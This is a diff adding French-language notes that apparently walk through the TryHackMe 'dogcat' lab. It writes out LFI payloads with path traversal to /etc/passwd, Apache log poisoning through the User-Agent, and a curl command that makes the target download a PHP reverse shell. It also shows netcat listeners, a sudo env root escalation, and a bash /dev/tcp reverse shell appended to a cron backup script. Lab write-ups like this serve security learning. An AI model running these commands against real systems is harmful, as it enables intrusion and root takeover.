@@ -1,0 +1,55 @@
+TryHackMe notes :
+
+10.10.16.68 :
+port 22 : tcp open ssh - OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+port 80 : tcp open http - Apache httpd 2.4.38 ((Debian)) MAC Address: 02:AD:9A:52:0A:59 (Unknown)
+
+remplacer ?view=dog par ?view=php://filter/convert.base64-encode/resource=dog/../index
+on recupère ainsi tout le code php ! (en base 64, il faut donc le convertire)
+on voit bien la vunerabilté sur le view ! 
+peut-être remplacer le contains par un =
+
+on vois une autre varaible : "ext" pour les extension de ficher ! on rentre donc : "?view=dog../../../../../../../../etc/passwd&ext="
+On recupère tous les utilisateurs !
+
+ubuntu avec apach 2 -> /var/log/Apache2/acces.log -> vois historiques des acces à l'app
+
+En utlisant burp, on a mis du php dans le useragent et on a reuperé la liste des fichiers à l'emplacement
+fianlement on crée une nouvelle variable : cmd et on va lui mettre un paramtre dans la requte directement (cmd=ls) c'est une autre façon de faire pour avoir la liste des fichiers (cette fois directement dans le navigateur)
+
+Avec un ls on recupère les deux premiers flags
+
+On fait un reverse shell en tant que www.data :
+on telecharge le php-reverse-shell.php, on change nos adresses ip et on le place dans un endroit simple
+
+on ouvre un cmd on cd à l'endroi du fichier .php (le nb1)
+on en ouvre un autre (nb2) et on fait ça :
+
+10.10.70.56 nb1 # python -m http.server 8082
+
+10.10.70.56 nb2 # curl -A "<?php file_put_contents('php-reverse-shell.php', file_get_contents('http://10.10.70.56:8082/php-reverse-shell.php'));?>" "http://10.10.16.68/?view=dog/../../../../../../../../../../var/log/apache2/access.log&ext="
+
+10.10.70.56 nb2 # nc -lnvp 1234
+on refresh le site web avec l'URL suivante : http://10.10.94.1/?view=dog/../php-reverse-shell
+
+et bim ! on est en shell !!
+
+On va tester une elevation de privilèges. on commence donc avec sudo -l
+on a accès sans mdp à env en tant que root 
+on se renseigne sur ce que on peut faire avec cette commande (merci internet)
+
+on peut faire ça : sudo /usr/bin/env /bin/sh
+a première vue rien ne se passe, mais en fait on est sur un terminal en mode root !
+on a donc réussi notre elevation de privilèges 
+avec un ls, on voit un fichier flag3.txt, on le lit en faisant cat fla3.txt
+on voit également un dossier backups contenant un fichier backup.sh on le lit.
+on comprend que c'est un .tar de /root/container (au passage, on trouve un nouveu chemin, c'est interressant)
+
+On va faire un reverse shell en bash cette fois
+dans nb1 : echo "bash -i >& /dev/tcp/10.10.70.56/9876 0>&1" >> backup.sh
+nb1 : cat backup.sh
+nb3 : nc -lnvp 9876
+on est connecté en reverse shell sous root@dogcat
+et avec un simple ls, on voit le flag4.txt
+
+Donc pour resumé le reverse shell sous php pour naviguer sur le serveur et celui sous bash car on voit que c'est un docker et on veut passer cet environnement
